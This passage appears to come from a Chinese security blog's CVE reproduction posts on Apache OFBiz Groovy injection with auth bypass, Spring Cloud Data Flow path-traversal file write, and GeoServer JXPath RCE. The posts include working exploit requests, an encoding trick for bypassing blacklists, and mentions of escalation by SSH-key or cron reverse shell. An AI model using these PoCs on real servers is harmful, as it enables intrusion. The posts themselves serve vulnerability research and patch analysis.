Safari/537.36 Edg/119.0.0.0\nContent-Type: application/x-www-form-urlencoded \nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\nContent-Length: 190\n\ngroovyProgram=\\u0074\\u0068\\u0072\\u006f\\u0077\\u0020\\u006e\\u0065\\u0077\\u0020\\u0045\\u0078\\u0063\\u0065\\u0070\\u0074\\u0069\\u006f\\u006e\\u0028\\u0027\\u0063\\u0061\\u006c\\u0063\\u0027\\u002e\\u0065\\u0078\\u0065\\u0063\\u0075\\u0074\\u0065\\u0028\\u0029\\u002e\\u0074\\u0065\\u0078\\u0074\\u0029\\u003b\n```\n\n<img src=\"/img/24-8-9/2.png\" >\n经过另外一位师傅的测试，不用; 和../../也可以\n<img src=\"/img/24-8-9/3.png\" >\n\ngroovy代码注入，早在2023年就出现过CVE:  CVE-2023-51467\n[https://blog.csdn.net/qq_53003652/article/details/135311261](https://blog.csdn.net/qq_53003652/article/details/135311261)\n\n### 编码绕过\n在CVE-2023-51467  的基础上  进行unicode编码绕过\n断点：groovyScripts/entity/ProgramExport.groovy\n<img src=\"/img/24-8-9/4.png\" >\n跟进isValidText\n黑名单检测：\n<img src=\"/img/24-8-9/5.png\" >\n<img src=\"/img/24-8-9/6.png\" >\n\n搬了exec  所以 直接 execute 也是不行的\n进行unicode编码，能进行绕过\n\n\n### 路径遍历\n在一个ControlFilter的处理逻辑\n<img src=\"/img/24-8-9/7.png\" >\n\n\n<img src=\"/img/24-8-9/8.png\" >\n\n\n在这里主要关注的点是为什么请求的是/webtools/control/forgotPassword/ProgramExport接口时，但是实际调用的是ProgramExport接口，而且能利用forgotPassword来绕过身份验证\n\n\n具体的处理逻辑从webapp.control.ControlServlet#doGet()开始，该方法主要是做请求预处理，包括获取用户session信息、设置响应头，接着就会进入到RequestHandler.doRequest()\n\n\n从代码上看，安全策略是由xml来配置的，找到相关配置文件：\nwebcommon/WEB-INF/common-controller.xml\n在xml中获取request-map标签的相关信息，在security标签中保存了接口是否需要鉴权的信息，当该接口无需身份验证就能访问时auth的值就为false，从下图中我们可以看到forgotPassword是无需鉴权的\n<img src=\"/img/24-8-9/9.png\" >\n\nrequestMap对象属性为securityAuth，该属性的值是从commom-controller.xml中获取的，保存的是security标签里auth的值，如果为true 就会检查是否登录了\n<img src=\"/img/24-8-9/10.png\" >\n再看看requestMap 怎么来的：\n<img src=\"/img/24-8-9/11.png\" >\n\n也就是 取决于前面的defaultRequestUri\n\n继续查看defaultRequestUri\n<img src=\"/img/24-8-9/12.png\" >\n\n<img src=\"/img/24-8-9/13.png\" >\ntomcat 是这么解析的，看到解析的时候忽略了;\n<img src=\"/img/24-8-9/14.png\" >\n这里取的是第一个元素，自然是forgotPassword\n\n\n然而最后的view视图是取决于overrideViewUri\n<img src=\"/img/24-8-9/15.png\" >\n\n<img src=\"/img/24-8-9/16.png\" >\n与前面不同的是，这里会取第二个元素\n<img src=\"/img/24-8-9/17.png\" >\n\n总结： 检查鉴权的是defaultRequestUri ( forgotPassword ) 而渲染视图的是 overrideViewUri（ProgramExport） \n这样就绕过了登录检查，平常审计的时候也应该密切关注安全检查的策略\n\n\n\n### 修复\n来看看修复方式：\n<img src=\"/img/24-8-9/18.png\" >\nfilter里面就搬了;和./\n此外还对接口脚本处，多增一处权限校验\n<img src=\"/img/24-8-9/19.png\" >\n\n进一步的修复：[https://github.com/apache/ofbiz-framework/commit/6c3b0068a99bb3b93321fdb983a0046b0679c86d](https://github.com/apache/ofbiz-framework/commit/6c3b0068a99bb3b93321fdb983a0046b0679c86d)\n\n就不跟了\n\nReference:\n\n- [https://github.com/apache/ofbiz-framework/commit/d1eb477355](https://github.com/apache/ofbiz-framework/commit/d1eb477355)\n- [https://xz.aliyun.com/t/14733?time__1311=GqAh7IqGrhkD%2FWNiQ%3DGQvE98xgAfAeD](https://xz.aliyun.com/t/14733?time__1311=GqAh7IqGrhkD%2FWNiQ%3DGQvE98xgAfAeD)\n- [https://github.com/Mr-xn/CVE-2024-32113?tab=readme-ov-file](https://github.com/Mr-xn/CVE-2024-32113?tab=readme-ov-file)\n- [https://forum.butian.net/share/3090](https://forum.butian.net/share/3090)\n","tags":["web安全","表达式注入","Apache","cve","Govvy","路径遍历"],"categories":["cve复现"]},{"title":"springcloud dataflow任意文件写入（CVE-2024-22263）","url":"/2024/07/12/springcloud-dataflow任意文件写入（CVE-2024-22263）/","content":"\n\n\n\n\n\n# springcloud dataflow任意文件写入（CVE-2024-22263）\n\n\n## 概述\n**信息参考**：[https://spring.io/security/cve-2024-22263](https://spring.io/security/cve-2024-22263)\n**披露时间**： 2024.5.23\n**分析时间**：2024.6.18\n**github源码**：[https://github.com/spring-cloud/spring-cloud-dataflow](https://github.com/spring-cloud/spring-cloud-dataflow)\n**github 修复 commit** ：[Improved validateUploadRequest and applied after tmp directory was cr… · spring-cloud/spring-cloud-dataflow@2ac9bfa](https://github.com/spring-cloud/spring-cloud-dataflow/commit/2ac9bfa5c2f7cdcc86938ce036283a37008add31)\n**分析版本**：2.11.2\n**其余信息**：分析时候暂无公开poc\n\n\n\n## 环境搭建\n官网查看docker-compose 的搭建方式，修改镜像版本\n在原本的yaml中修改\n向skipper-server服务中添加远程调式端口\n设置jvm启动变量JDK_JAVA_OPTIONS ，添加远程调式\n由于默认版本是jdk11所以添加：\n```\n-agentlib:jdwp=transport=dt_socket,server=y,suspend=n,address=*:8453\n```\n```yaml\nversion: '3'\nservices:\n  dataflow-server:\n    user: root\n    image: springcloud/spring-cloud-dataflow-server:${DATAFLOW_VERSION:-2.11.2-SNAPSHOT}${BP_JVM_VERSION:-}\n    container_name: dataflow-server\n    ports:\n      - \"9393:9393\"\n    environment:\n      - LANG=en_US.utf8\n      - LC_ALL=en_US.utf8\n      - JDK_JAVA_OPTIONS=-Dfile.encoding=UTF-8 -Dsun.jnu.encoding=UTF-8\n      # Set CLOSECONTEXTENABLED=true to ensure that the CRT launcher is closed.\n      - SPRING_CLOUD_DATAFLOW_APPLICATIONPROPERTIES_TASK_SPRING_CLOUD_TASK_CLOSECONTEXTENABLED=true\n      - SPRING_CLOUD_SKIPPER_CLIENT_SERVER_URI=${SKIPPER_URI:-http://skipper-server:7577}/api\n      # (Optionally) authenticate the default Docker Hub access for the App Metadata access.\n      - SPRING_CLOUD_DATAFLOW_CONTAINER_REGISTRY_CONFIGURATIONS_DEFAULT_USER=${METADATA_DEFAULT_DOCKERHUB_USER}\n      - SPRING_CLOUD_DATAFLOW_CONTAINER_REGISTRY_CONFIGURATIONS_DEFAULT_SECRET=${METADATA_DEFAULT_DOCKERHUB_PASSWORD}\n      - SPRING_CLOUD_DATAFLOW_CONTAINER_REGISTRYCONFIGURATIONS_DEFAULT_USER=${METADATA_DEFAULT_DOCKERHUB_USER}\n      - SPRING_CLOUD_DATAFLOW_CONTAINER_REGISTRYCONFIGURATIONS_DEFAULT_SECRET=${METADATA_DEFAULT_DOCKERHUB_PASSWORD}\n    depends_on:\n      - skipper-server\n    restart: always\n    volumes:\n      - ${HOST_MOUNT_PATH:-.}:${DOCKER_MOUNT_PATH:-/home/cnb/scdf}\n\n  app-import-stream:\n    image: springcloud/baseimage:1.0.4\n    container_name: dataflow-app-import-stream\n    depends_on:\n      - dataflow-server\n\n  app-import-task:\n    image: springcloud/baseimage:1.0.4\n    container_name: dataflow-app-import-task\n    depends_on:\n      - dataflow-server\n    command: >\n      /bin/sh -c \"\n        ./wait-for-it.sh -t 360 dataflow-server:9393;\n        wget -qO- '${DATAFLOW_URI:-http://dataflow-server:9393}/apps' --no-check-certificate --post-data='uri=${TASK_APPS_URI:-https://dataflow.spring.io/task-maven-latest&force=true}';\n        wget -qO- '${DATAFLOW_URI:-http://dataflow-server:9393}/apps/timestamp3' --no-check-certificate --post-data='bootVersion=3&uri=maven://uri=maven:io.spring:timestamp-task:3.0.0';\n        wget -qO- '${DATAFLOW_URI:-http://dataflow-server:9393}/apps/timestamp-batch3' --no-check-certificate --post-data='bootVersion=3&uri=maven://uri=maven:io.spring:timestamp-batch:3.0.0';\n        echo 'Maven Task apps imported'\"\n\n  skipper-server:\n    user: root\n    image: springcloud/spring-cloud-skipper-server:${SKIPPER_VERSION:-2.11.2-SNAPSHOT}${BP_JVM_VERSION:-}\n    container_name: skipper-server\n    ports:\n      - \"7577:7577\"\n      - \"8453:8453\"\n      - ${APPS_PORT_RANGE:-20000-20195:20000-20195}\n    environment:\n      - LANG=en_US.utf8\n      - LC_ALL=en_US.utf8\n      - JDK_JAVA_OPTIONS=-Dfile.encoding=UTF-8 -Dsun.jnu.encoding=UTF-8 -agentlib:jdwp=transport=dt_socket,server=y,suspend=n,address=*:8453\n      - SERVER_PORT=7577\n      - SPRING_CLOUD_SKIPPER_SERVER_PLATFORM_LOCAL_ACCOUNTS_DEFAULT_PORTRANGE_LOW=20000\n      - SPRING_CLOUD_SKIPPER_SERVER_PLATFORM_LOCAL_ACCOUNTS_DEFAULT_PORTRANGE_HIGH=20190\n      - LOGGING_LEVEL_ORG_SPRINGFRAMEWORK_CLOUD_SKIPPER_SERVER_DEPLOYER=ERROR\n    \n    restart: always\n    volumes:\n      - ${HOST_MOUNT_PATH:-.}:${DOCKER_MOUNT_PATH:-/home/cnb/scdf}\n```\n\n<img src=\"/img/24-7-12/1.png\" >\n启动：docker-compse up -d\n<img src=\"/img/24-7-12/2.png\" >\n漏洞通告上已经说明是skipper-server\n那么访问7577端口\n<img src=\"/img/24-7-12/3.png\" >\n## 漏洞分析\n根据commit 定位到spring-cloud-skipper\\spring-cloud-skipper-server-core\\src\\main\\java\\org\\springframework\\cloud\\skipper\\server\\service\\PackageService.java\n### poc\n```\nPOST /api/package/upload HTTP/1.1\nHost: 192.168.88.65:7577\nAccept-Encoding: gzip, deflate\nAccept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7\nUpgrade-Insecure-Requests: 1\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 Edg/119.0.0.0\nContent-Type: application/json\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\nContent-Length: 190\n\n{\n  \"name\": \"../../../yyjccc\",\n  \"repoName\": \"local\",\n  \"version\": \"1.0.0\",\n  \"extension\": \"zip\",\n  \"packageFileAsBytes\": [80,75,3,4,20,0,0,0,0,0,200,187,210,88,142,142,69,37,15,0,0,0,15,0,0,0,8,0,0,0,116,101,115,116,46,116,120,116,116,104,105,115,32,119,101,98,115,104,101,108,108,13,10,80,75,1,2,20,0,20,0,0,0,0,0,200,187,210,88,142,142,69,37,15,0,0,0,15,0,0,0,8,0,0,0,0,0,0,0,1,0,32,0,0,0,0,0,0,0,116,101,115,116,46,116,120,116,80,75,5,6,0,0,0,0,1,0,1,0,54,0,0,0,53,0,0,0,0,0]\n}\n```\n### 分析过程\n定位到upload函数\n<img src=\"/img/24-7-12/4.png\" >\n找到调用的接口：\n/api/package/upload\n<img src=\"/img/24-7-12/5.png\" >\n请求参数UploadRequest，默认使用jackson，也就是说是json格式的数据\n<img src=\"/img/24-7-12/6.png\" >\n那么文件内容就应该是byte数组（ascii码的数组）\n 编写脚本读取文件\n```python\nimport json\n\n\ndef file_to_byte_array(file_path):\n    try:\n        with open(file_path, 'rb') as file:\n            content = file.read()\n            byte_array = list(content)\n            return byte_array\n    except Exception as e:\n        print(f\"Error reading file: {e}\")\n        return None\n\n\ndef byte_array_to_json(byte_array):\n    try:\n        return json.dumps(byte_array)\n    except Exception as e:\n        print(f\"Error converting to JSON: {e}\")\n        return None\n\n\nif __name__ == \"__main__\":\n    file_path = 'test.zip'  # 替换为你要读取的文件路径\n    byte_array = file_to_byte_array(file_path)\n    if byte_array is not None:\n        byte_json = byte_array_to_json(byte_array)\n        if byte_json is not None:\n            print(byte_json)\n\n```\n跟进validateUploadRequest方法\n<img src=\"/img/24-7-12/7.png\" >\n可知所有属性都不能为空，且版本vesion要满足规范，extension只能是zip,也就是说上传的文件数据必须是zip格式的\n跟进getRepositoryToUpload方法\n<img src=\"/img/24-7-12/8.png\" >\n这里必须能够获取到Repository\n查看/api/repositories\n<img src=\"/img/24-7-12/9.png\" >\n默认有一个名为local的存储库\n\n接下来继续分析\n```java\n\npackageDirPath = TempFileUtils.createTempDirectory(\"skipperUpload\");\nFile packageDir = new File(packageDirPath + File.separator + uploadRequest.getName());\npackageDir.mkdir();\nPath packageFile = Paths.get(packageDir.getPath() + File.separator + uploadRequest.getName() + \"-\"+ uploadRequest.getVersion() + \".\" + uploadRequest.getExtension());\nAssert.isTrue(packageDir.exists(), \"Package directory doesn't exist.\");\nFiles.write(packageFile, uploadRequest.getPackageFileAsBytes());\nZipUtil.unpack(packageFile.toFile(), packageDir);\nString unzippedPath = packageDir.getAbsolutePath() + File.separator + uploadRequest.getName()+ \"-\" + uploadRequest.getVersion();\nFile unpackagedFile = new File(unzippedPath);\n```\n首先会创建临时目录\n<img src=\"/img/24-7-12/10.png\" >\n然后再将临时目录与name拼接，作为临时文件上传目录。\n漏洞点就出现在这里，如果name中有../等进行目录遍历，那么就可以设置任意的目录为上传目录\n<img src=\"/img/24-7-12/11.png\" >\n然后与name,version与extension相加然后得到要写入数据的文件的完整路径（name拼接了两次）\n<img src=\"/img/24-7-12/12.png\" >\n然后解压到上传目录\n最后还拼接得到（这里加上了-version），再检查是否存在\n<img src=\"/img/24-7-12/13.png\" >\n也就是说会异常\n走到finally代码块\n<img src=\"/img/24-7-12/14.png\" >\n会删除临时目录，原本正常的请求，由于上一级目录删除了，上传的文件就删除了，但通过目录遍历，上传目录已经不是临时目录中的子目录了，所以不会删除\n最终效果：\n<img src=\"/img/24-7-12/15.png\" >\n<img src=\"/img/24-7-12/16.png\" >\n## 利用\nspringboot fat 从任意文件写入到RCE\n或者是写ssh公钥（物理机环境）\n写计划任务反弹shell\n\n## 修复分析\n[https://github.com/spring-cloud/spring-cloud-dataflow/commit/2ac9bfa5c2f7cdcc86938ce036283a37008add31](https://github.com/spring-cloud/spring-cloud-dataflow/commit/2ac9bfa5c2f7cdcc86938ce036283a37008add31)\n\n主要修改\n<img src=\"/img/24-7-12/17.png\" >\npackageDirPath.toFile().getCanonicalPath() 是Java中的用于获取文件路径的规范路径。规范路径是指消除路径中的冗余部分（如..和.）之后的路径。  \n如：若packageDirPath 为 /tmp/upload/../../yyjccc\n则packageDirPath.toFile().getCanonicalPath() 为 /yyjccc\n然后再判断上传目录是否以临时目录开头，若进行了目录遍历（像上面临时目录为/tmp/upload，目标目录为/yyjccc）就会抛出异常，就无法继续下去，因此也是修复了漏洞\n","tags":["web安全","springcloud"],"categories":["cve复现"]},{"title":"GeoServer表达式注入代码执行漏洞","url":"/2024/07/08/GeoServer表达式注入代码执行漏洞/","content":"\n\n\n\n# GeoServer表达式注入代码执行漏洞\n\n\n## 概述\n**信息参考**：[https://avd.aliyun.com/detail?id=AVD-2024-36401](https://avd.aliyun.com/detail?id=AVD-2024-36401)\n**披露时间**： 2024.7.2\n**github源码**：[https://github.com/geoserver/geoserver](https://github.com/geoserver/geoserver)\n**分析版本**：2.25.0\n**漏洞版本**：\n2.25.0 <= GeoServer < 2.25.2\n2.24.0 <= GeoServer < 2.24.4\nGeoServer < 2.23.6\n\n阐述：GeoServer由于GeoTool组件使用了含有漏洞的commons-jxpath组件导致表达式注入漏洞\n相关信息：\n漏洞通告：[https://github.com/geoserver/geoserver/security/advisories/GHSA-6jj6-gm7p-fcvv](https://github.com/geoserver/geoserver/security/advisories/GHSA-6jj6-gm7p-fcvv)\nGeoTool组件通告：[https://github.com/geotools/geotools/security/advisories/GHSA-w3pj-wh35-fq8w](https://github.com/geotools/geotools/security/advisories/GHSA-w3pj-wh35-fq8w)\nJxpath漏洞利用：[https://github.com/Warxim/CVE-2022-41852?tab=readme-ov-file#workaround-for-cve-2022-41852](https://github.com/Warxim/CVE-2022-41852?tab=readme-ov-file#workaround-for-cve-2022-41852)\n\n前置知识：\nJXPath表达式注入\n可参考：[https://www.yuque.com/yyjccc/pk74ko/zzgiottebwxay9e7](https://www.yuque.com/yyjccc/pk74ko/zzgiottebwxay9e7)\n## 环境搭建\n下载war包：https://sourceforge.net/projects/geoserver/files\n手动部署到Tomcat中，然后开启tomcat远程调试\n```java\n./catalina.bat jpda start\n```\n下载源码开启远程调式\n\n然后用poc跑一下，发现是用参数控制路由的，逆向看看:\n\ngeoserver虽然使用了spring，但还是在OWS模块定义了Dispatcher总的控制器\n<img src=\"/img/24-7-8/8.png\" >\n\n因此控制的流程还得看这个类\n以下载的war包为例子,web.xml\n```xml\n<!-- spring dispatcher servlet, dispatches all incoming requests -->\n<servlet>\n  <servlet-name>dispatcher</servlet-name>\n  <servlet-class>org.springframework.web.servlet.DispatcherServlet</servlet-class>\n</servlet>\n\n<!-- single mapping to spring, this only works properly if the advanced dispatch filter is \nactive -->\n<servlet-mapping>\n  <servlet-name>dispatcher</servlet-name>\n  <url-pattern>/*</url-pattern>\n</servlet-mapping>\n```\n在handleRequestInternal方法中可以看到是通过请求查找服务的\n<img src=\"/img/24-7-8/9.png\" >\nsevice方法中，如果请求方法是post方法，就会解析请求体的xml数据，然后你拿到对应的服务\n接着在handleRequestInternal方法中分发对应的方法,再进行调用\n<img src=\"/img/24-7-8/10.png\" >\n\n<img src=\"/img/24-7-8/11.png\" >\n## 漏洞分析\n根据漏洞公告：未提供公开 PoC，但已确认可通过 WFS GetFeature、WFS GetPropertyValue、WMS GetMap、WMS GetFeatureInfo、WMS GetLegendGraphic 和 WPS 执行请求利用此漏洞。\n\n由于GeoServer 调用的 GeoTools 库存在问题，GeoTools存在Jxpath漏洞的利用，然后Geoserver又能通过发送OGC请求去调用到存在漏洞的触发点\n\n根据GeoTool的漏洞通告：\n通过以下方法将 XPath 表达式传递到 commons-jxpath 库，该库可以执行任意代码，并且如果 XPath 表达式由用户输入提供，则会出现安全问题（geotool组件的问题）。\n\n- org.geotools.appschema.util.XmlXpathUtilites.getXPathValues(NamespaceSupport, String, Document)\n- org.geotools.appschema.util.XmlXpathUtilites.countXPathNodes(NamespaceSupport, String, Document)\n- org.geotools.appschema.util.XmlXpathUtilites.getSingleXPathValue(NamespaceSupport, String, Document)\n- org.geotools.data.complex.expression.FeaturePropertyAccessorFactory.FeaturePropertyAccessor.get(Object, String, Class<T>)\n- org.geotools.data.complex.expression.FeaturePropertyAccessorFactory.FeaturePropertyAccessor.set(Object, String, Object, Class)\n- org.geotools.data.complex.expression.MapPropertyAccessorFactory.new PropertyAccessor() {...}.get(Object, String, Class<T>)\n- org.geotools.xsd.StreamingParser.StreamingParser(Configuration, InputStream, String)\n\n\nGeoserver的漏洞通告中直接给出了可能存在的漏洞请求，以及请求方法如下\n\n- WFS GetFeature\n- WFS GetPropertyValue\n- WMS GetMap\n- WMS GetFeatureInfo\n- WMS GetLegendGraphic\n- WPS Execute\n\n\nWeb Feature Service （WFS）是开放地理空间联盟（OGC）创建的一个标准，用于在互联网上使用HTTP创建、修改和交换矢量格式的地理信息。WFS以地理标记语言（GML）编码和传输信息，GML是XML的一个子集。\n[https://www.osgeo.cn/geoserver-user-manual/services/wfs/reference.html](https://www.osgeo.cn/geoserver-user-manual/services/wfs/reference.html)\n以上是Geoserver对于wfs的介绍，其实就可以理解为一个协议，能够访问通过http访问地理信息的协议，然后该协议在不同版本有许多操作\n### GetPropertyValue\n我们需要利用的就是存在于2.0.0版本的GetPropertyValue操作\n从数据存储中为使用查询表达式标识的一组功能检索功能属性的值或复杂功能属性的部分值\n从描述就可以发现他是通过表达式语言查询对应的Property属性，这里具体指的就是特定地理特征类型（如地图中的河流、建筑物等）的描述信息，包括其属性和其他特性的定义。\n\n接着直接就在官网的文档找到了WFS GetPropertyValue的样例\n[https://www.osgeo.cn/geoserver-user-manual/services/wfs/reference.html](https://www.osgeo.cn/geoserver-user-manual/services/wfs/reference.html)\n<img src=\"/img/24-7-8/12.png\" >\n然后构造请求修改一下valueReference参数的值就能成功RCE\n实际情况命名空间需要自己获取\n获取api:直接访问：/geoserver/web/wicket/bookmarkable/org.geoserver.web.demo.MapPreviewPage\n即可\n<img src=\"/img/24-7-8/13.png\" >\n可能有些需要认证，哪个能用用哪个\n下面是几个默认的（实际中不一定有）：\n\n- sf:archsites\n\n示例poc:\n```\nPOST /geoserver/wfs HTTP/1.1\nHost: 127.0.0.1:7878\nAccept-Encoding: gzip, deflate, br\nAccept: */*\nAccept-Language: en-US;q=0.9,en;q=0.8\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.118 Safari/537.36\nConnection: close\nCache-Control: max-age=0\nContent-Type: application/xml\nContent-Length: 356\n\n<wfs:GetPropertyValue service='WFS' version='2.0.0'\n xmlns:topp='http://www.openplans.org/topp'\n xmlns:fes='http://www.opengis.net/fes/2.0'\n xmlns:wfs='http://www.opengis.net/wfs/2.0'>\n  <wfs:Query typeNames='sf:archsites'/>\n  <wfs:valueReference>exec(java.lang.Runtime.getRuntime(),'calc')</wfs:valueReference>\n</wfs:GetPropertyValue>\n```\n等价的get请求\n```java\n/geoserver/wfs?service=WFS&version=2.0.0&request=GetPropertyValue&typeNames=sf:archsites&valueReference=exec(java.lang.Runtime.getRuntime(),'calc')\n```\n\n然后定位到GetPropertyValue#run方法\n<img src=\"/img/24-7-8/14.png\" >\n跟进property方法\n<img src=\"/img/24-7-8/15.png\" >\n返回的是AttributeExpressionImpl对象\n<img src=\"/img/24-7-8/16.png\" >\n这里可以看到，传入的name，赋值给attpath属性,可知request.getValueReference(),即ValueReference标签对应着xpath表达式\n那么，就是这样控制xpath表达式的，接着看怎么执行的\n跟进AttributeExpressionImpl#evaluate方法\n也是将上面赋值的attPath传入了\n<img src=\"/img/24-7-8/17.png\" >\n\n也是来到了漏洞api ：FeaturePropertyAccessorFactory#get\n<img src=\"/img/24-7-8/18.png\" >\n这里iteratePointers方法就能触发了漏洞了，可以参考之前的文章\n### GetFeature\n这个请求是用于从服务器检索地理空间要素的全部或部分属性及几何信息，而通过前面的漏洞的分析我们很容易知道漏洞触发点是在属性名查询这里，所以这里的GetFeature请求我们重点关注一下filter过滤逻辑部分，对于属性名的处理\n\n\n```java\n// 定义一个名为validateFilter的方法，该方法接收四个参数：一个Filter对象，一个Query对象，一个FeatureTypeInfo对象和一个GetFeatureRequest对象。\nvoid validateFilter(\n        Filter filter, Query query, final FeatureTypeInfo meta, final GetFeatureRequest request)\n        throws IOException {\n\n    // 1. 确保任何属性名都指向一个实际存在的属性\n    // 获取特征类型\n    final FeatureType featureType = meta.getFeatureType();\n    // 创建一个表达式访问器\n    ExpressionVisitor visitor =\n            new AbstractExpressionVisitor() {\n                // 重写visit方法\n                @Override\n                public Object visit(PropertyName name, Object data) {\n                    // 如果属性名在特征类型中找不到，并且属性名不是GmlBoundedBy\n                    if (name.evaluate(featureType) == null && !isGmlBoundedBy(name)) {\n                        // 抛出一个WFSException异常，异常信息为\"非法的属性名\"\n                        throw new WFSException(\n                                request,\n                                \"Illegal property name: \"\n                                        + name.getPropertyName()\n                                        + \" for feature type \"\n                                        + meta.prefixedName(),\n                                \"InvalidParameterValue\");\n                    }\n\n                    return name;\n                }\n            };\n    // 使用访问器访问过滤器\n    filter.accept(new AbstractFilterVisitor(visitor), null);\n\n    // 2. 确保任何空间谓词都是针对实际的空间属性\n    // 创建一个过滤器访问器\n    AbstractFilterVisitor fvisitor =\n            new AbstractFilterVisitor() {\n\n                // 重写visit方法\n                @Override\n                protected Object visit(BinarySpatialOperator filter, Object data) {\n                    PropertyName name = null;\n                    // 如果过滤器的第一个表达式是属性名\n                    if (filter.getExpression1() instanceof PropertyName) {\n                        name = (PropertyName) filter.getExpression1();\n                    } else if (filter.getExpression2() instanceof PropertyName) {\n                        // 如果过滤器的第二个表达式是属性名\n                        name = (PropertyName) filter.getExpression2();\n                    }\n\n                    if (name != null) {\n                        // 检查特征类型以确保其是一个几何类型\n                        AttributeDescriptor att =\n                                (AttributeDescriptor) name.evaluate(featureType);\n                        if (!(att instanceof GeometryDescriptor) && !isGmlBoundedBy(name)) {\n                            // 如果不是，抛出一个WFSException异常，异常信息为\"属性不是特征类型的几何属性\"\n                            throw new WFSException(\n                                    request,\n                                    \"Property \"\n                                            + name\n                                            + \" is not geometric in feature type \"\n                                            + meta.prefixedName(),\n                                    \"InvalidParameterValue\");\n                        }\n                    }\n\n                    return filter;\n                }\n            };\n    // 使用访问器访问过滤器\n    filter.accept(fvisitor, null);\n\n    // 3. 确保查询中指定的任何边界都相对于查询上定义的srs是有效的\n    // 如果wfs是CiteCompliant\n    if (wfs.isCiteCompliant()) {\n\n        // 如果查询的srsName不为空\n        if (query.getSrsName() != null) {\n            final Query fquery = query;\n            // 创建一个CiteBBOXValidator对象\n            fvisitor = new CiteBBOXValidator(fquery, request);\n\n            // 使用访问器访问过滤器\n            filter.accept(fvisitor, null);\n        }\n    }\n\n    // 4. 确保在非空间比较中不使用空间属性 (CITE WFS 2.0)\n    // 如果wfs是CiteCompliant\n    if (wfs.isCiteCompliant()) {\n        // 创建一个过滤器访问器\n        fvisitor =\n                new AbstractFilterVisitor() {\n                    // 重写visit方法\n                    @Override\n                    protected Object visit(BinaryComparisonOperator filter, Object data) {\n                        Expression ex1 = filter.getExpression1();\n                        Expression ex2 = filter.getExpression2();\n                        // 如果第一个表达式是属性名\n                        if (ex1 instanceof PropertyName) {\n                            checkNonSpatial((PropertyName) ex1);\n                        }\n                        // 如果第二个表达式是属性名\n                        if (ex2 instanceof PropertyName) {\n                            checkNonSpatial((PropertyName) ex2);\n                        }\n\n                        return super.visit(filter, data);\n                    }\n\n                    // 定义一个检查非空间的方法\n                    private void checkNonSpatial(PropertyName pn) {\n                        AttributeDescriptor ad = (AttributeDescriptor) pn.evaluate(featureType);\n                        // 如果属性描述符是一个几何描述符或者是GmlBoundedBy\n                        if (ad instanceof GeometryDescriptor || isGmlBoundedBy(pn)) {\n                            // 抛出一个WFSException异常，异常信息为\"不能在字母数字二进制比较中使用空间属性\"\n                            throw new WFSException(\n                                    request,\n                                    \"Cannot use a spatial property in a alphanumeric binary \"\n                                            + \"comparison\");\n                        }\n                    }\n                };\n\n        // 使用访问器访问过滤器\n        filter.accept(fvisitor, null);\n    }\n```\n```java\n\n/geoserver/wms?version=1.3.0&bbox=24,-130,50,-66&Format=image/png&request=GetMap&width=550&height=250&crs=EPSG:4326&SLD_BODY=%3CStyledLayerDescriptor+version%3D%221.1.0%22%3E%3CUserLayer%3E%3CName%3Etopp%3Astates%3C%2FName%3E%3CUserStyle%3E%3CName%3EUserSelection%3C%2FName%3E%3CFeatureTypeStyle%3E%3CRule%3E%3CFilter%3E%3CPropertyIsEqualTo%3E%3CPropertyName%3Eexec%28java.lang.Runtime.getRuntime%28%29%2C%22calc%22%29%3C%2FPropertyName%3E%3CLiteral%3EIllinois%3C%2FLiteral%3E%3C%2FPropertyIsEqualTo%3E%3C%2FFilter%3E%3CPolygonSymbolizer%3E%3CFill%3E%3CSvgParameter+name%3D%22fill%22%3E%23FF0000%3C%2FSvgParameter%3E%3C%2FFill%3E%3C%2FPolygonSymbolizer%3E%3C%2FRule%3E%3CRule%3E%3CLineSymbolizer%3E%3CStroke%2F%3E%3C%2FLineSymbolizer%3E%3C%2FRule%3E%3C%2FFeatureTypeStyle%3E%3C%2FUserStyle%3E%3C%2FUserLayer%3E%3C%2FStyledLayerDescriptor%3E \n```\n<img src=\"/img/24-7-8/19.png\" >\n跟上面的一样是从evalute走入的\n## 其他Poc\n### BBOX-1.0\n```\npost:\n<wfs:GetFeature service=\"WFS\" version=\"1.0.0\"\n  xmlns:topp=\"http://www.openplans.org/topp\"\n  xmlns:wfs=\"http://www.opengis.net/wfs\"\n  xmlns:ogc=\"http://www.opengis.net/ogc\"\n  xmlns:gml=\"http://www.opengis.net/gml\"\n  xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n  xsi:schemaLocation=\"http://www.opengis.net/wfs\">\n  <wfs:Query typeName=\"topp:states\">\n    <ogc:Filter>\n      <ogc:BBOX>\n        <ogc:PropertyName>exec(java.lang.Runtime.getRuntime(),\"calc\")</ogc:PropertyName>\n        <gml:Box srsName=\"http://www.opengis.net/gml/srs/epsg.xml#4326\">\n           <gml:coordinates>-75.102613,40.212597 -72.361859,41.512517</gml:coordinates>\n        </gml:Box>\n      </ogc:BBOX>\n   </ogc:Filter>\n  </wfs:Query>\n</wfs:GetFeature>\n```\n### BBOX-1.1\n```\npost:\n<wfs:GetFeature service=\"WFS\" version=\"1.1.0\"\n  xmlns:topp=\"http://www.openplans.org/topp\"\n  xmlns:wfs=\"http://www.opengis.net/wfs\"\n  xmlns:ogc=\"http://www.opengis.net/ogc\"\n  xmlns:gml=\"http://www.opengis.net/gml\"\n  xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n  xsi:schemaLocation=\"http://www.opengis.net/wfs\">\n  <wfs:Query typeName=\"topp:states\">\n    <ogc:Filter>\n      <ogc:BBOX>\n        <ogc:PropertyName>exec(java.lang.Runtime.getRuntime(),\"calc\")</ogc:PropertyName>\n        <gml:Envelope srsName=\"http://www.opengis.net/gml/srs/epsg.xml#4326\">\n           <gml:lowerCorner>-75.102613 40.212597</gml:lowerCorner>\n           <gml:upperCorner>-72.361859 41.512517</gml:upperCorner>\n        </gml:Envelope>\n      </ogc:BBOX>\n   </ogc:Filter>\n  </wfs:Query>\n</wfs:GetFeature>\n```\n### 